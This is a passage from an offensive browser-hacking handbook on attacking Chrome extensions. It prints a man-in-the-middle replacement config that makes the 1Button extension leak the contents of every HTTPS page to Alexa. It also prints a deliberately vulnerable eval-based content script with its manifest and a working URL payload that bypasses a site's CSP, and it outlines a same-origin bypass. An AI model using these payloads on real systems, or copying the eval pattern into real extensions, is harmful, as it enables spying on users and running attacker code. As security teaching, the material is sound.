
The search_conf.js file describes what elements should be extracted off visited web pages to report them to Alexa. The following snippet will give you a taste of what is going on:

```
{
  "google" : {
    "urlexp" : 
      "http(s)?:\\/\\/www\\.google\\..*\\/.*[?#&]q=([^&]+)",
    "rankometer" : {
      "url":"http(s)?:\\/\\/(www(|[0-9])|encrypted)\\.(|l\\.)google\\..*\\/",
      "reload": true,
      "xpath" : {
        "block": [
          "//div/ol/li[ contains( 
            concat( ' ', normalize-space(@class), ' ' ),
            concat( ' ', 'g', ' ' ) 
          )]",
          "//div/ol/li[ contains( 
            concat( ' ', normalize-space(@class), ' ' ),
            concat( ' ', 'g', ' ' ) 
          )]",
          "//div/ol/li[ contains( 
            concat( ' ', normalize-space(@class), ' ' ),
            concat( ' ', 'g', ' ' ) 
          )]"
        ],
        "insert" : [
          "./div/div/div/cite",
          "./div/div[ contains( 
            concat( ' ', normalize-space(@class), ' ' ),
            concat( ' ', 'kv', ' ' ) 
          )]/cite",
          "./div/div/div/div[ contains( 
            concat( ' ', normalize-space(@class), ' ' ),
            concat( ' ', 'kv', ' ' ) 
          )]/cite"
        ],
        "target" : [
          "./div/h3[ contains( 
            concat( ' ', normalize-space(@class), ' '), 
            ' r '
          )]/descendant::a/@href",
          "./h3[ contains( 
            concat( ' ', normalize-space(@class), ' '), 
            ' r '
          )]/descendant::a/@href",
          "./div/h3[ contains( 
            concat( ' ', normalize-space(@class), ' ' ), 
            ' r '
          )]/descendant::a/@href"
        ]
      }
    },
    ...
  },
  ...
}
```

The scraped website contents matching XPath expressions in the search_conf.js file are reported to [http://widgets.alexa.com](http://widgets.alexa.com). These are shown in the previous configuration content.

[Figure 7-14](#c07.html#figure7-14) is a screenshot showing mitmproxy35 intercepting the communication to [http://widgets.alexa.com](http://widgets.alexa.com).

 start figure 

[**Figure 7-14:**](#c07.html#figureanchor7-14) Man-in-the-Middle traffic with the 1Button extension

![c07f014.tif](image_fi/662090c07/c07f014.png)

 end figure 

However, there’s another glaring vulnerability. Remember the configuration URLs? You will notice that they are fetched over HTTP and not HTTPS. This makes them vulnerable to a MitM attack too!

Let’s say you use MitM techniques to replace httpsdatalist.dat with the following code:

```
["https://"]
```

You will also use the following code when middling the search_conf.js request:

```
{
  "pwn" : {
    "urlexp" : "http(s)?:\\/\\/",
    "rankometer" : {
      "url" :"http(s)?:\\/\\/",
      "reload": true,
      "xpath" : {
        "block": [
          "//html"
        ],
        "insert" : [
          "//html"
        ],
        "target" : [
          "//html"
        ]
      }
    },
    "cba" : {
      "url" :"http(s)?:\\/\\/",
      "reload": true
    }
  }
}
```

Using this attack, the extension will report (to Alexa) the DOM node contents of all HTTPS websites. This was achieved even without the need to inject instructions into the privileged context. All that you changed was the configuration, which resulted in you observing all the requests the user is making due to your MitM position.

### Bypassing Web Application CSP

There is one conspicuous Chrome extension component that misses out on CSP protection. The web application can employ CSP by including the HTTP header X-Content-Security-Policy in the response. The extension background page also has CSP by default. The component missing this protection is the content script.

That is right; the Chrome extension content script has no CSP protection at all. This makes for an obvious target to get around any pesky CSP restrictions implemented by the web application developers. Let’s explore how you can use this component to do your bidding.

For this example, let’s use the http://content-security-policy.com origin. If you load the URL you can look at the headers related to CSP. These are shown in the following example:

```
X-Content-Security-Policy: default-src 'self' www.google-analytics.com
 netdna.bootstrapcdn.com ajax.googleapis.com;
 object-src 'none'; media-src 'none'; frame-src 'none'; connect-src 'none';
```

The first thing to note for this example is the absence of the unsafe-eval directive. This means that when you attack this origin, you can’t leverage the eval function (or its friends, as discussed in Chapter 3) to achieve your ends. Well, that is unless you have a vulnerability in one of your target’s content scripts.

The following vulnerable content script is one you’ll use for this CSP bypass example:

```
// Get bhh URL parameter
var bhh = document.location.href.split('bhh=')[1];
if (typeof bhh == 'string') {
  eval(bhh); // eval the parameter
}
```

It has the following manifest file that only uses content scripts in your target http://content-security-policy.com origin:

```
{
  "name": "Browser Hacker's Handbook CSP Bypass Example",
  "version": "1.0",
  "description": "Browser Hacker's Handbook CSP Bypass Demonstration",
  "homepage_url": "http://browserhacker.com",
  "permissions": [
       "http://content-security-policy.com/*"
  ],
    "content_scripts": [
    {
      "all_frames": true, 
      "js": [
        "cs.js"
      ], 
      "matches": [
        "http://content-security-policy.com/*"
      ], 
      "run_at": "document_end",
      "all_frames": true
    }
    ],
    "manifest_version": 2
}
```

Now with your content script vulnerability in hand, let’s bypass the CSP control placed in the HTTP headers from the website:

```
http://content-security-policy.com/#bhh=
eval(alert('Browser Hacker\'s Handbook'))
```

When your target browser loads the preceding URL, it will circumvent the CSP. You will see that an eval is injected into the content script and runs your alert box within the origin. [Figure 7-15](#c07.html#figure7-15) shows the returned CSP headers and the successful execution of the eval function.

 start figure 

[**Figure 7-15:**](#c07.html#figureanchor7-15) Website CSP Bypass in a Chrome Extension

![c07f015.eps](image_fi/662090c07/c07f015.png)

 end figure 

You have successfully bypassed the CSP set by a web application through a vulnerability in a Chrome extension. More specifically, you have exploited a vulnerability in a content script, which has no protection given to it by CSP.

### Achieving Same Origin Policy Bypass

You may remember that Chrome content scripts have more privileges than the standard Internet zone. They do not have a vast number of extra privileges, but there is one you will be interested in. It is the ability to read the responses from cross-origin requests. That is powerful by itself, but it gets better. When the request is sent cross origin, the headers include any cookies that are associated with that origin. You guessed it: the cookie will include any authenticated session tokens, too.

A content script can operate in many ways, and there will be varying situations depending upon its purpose. In a lot of cases, the content script will be interacting with the DOM. Hence, the DOM will often form part of the attack surface.

Attacking an extension’s content scripts is very similar to exploiting classic DOM XSS. The good news here is you can reuse all your DOM XSS knowledge to exploit extensions.

For successful exploitation, the content script needs to grab your data and use it within the privileged context. The exact place in the DOM will depend on the extension being targeted. However, the <title> element is usually a safe bet, because a lot of extensions fetch content from the <title> element.
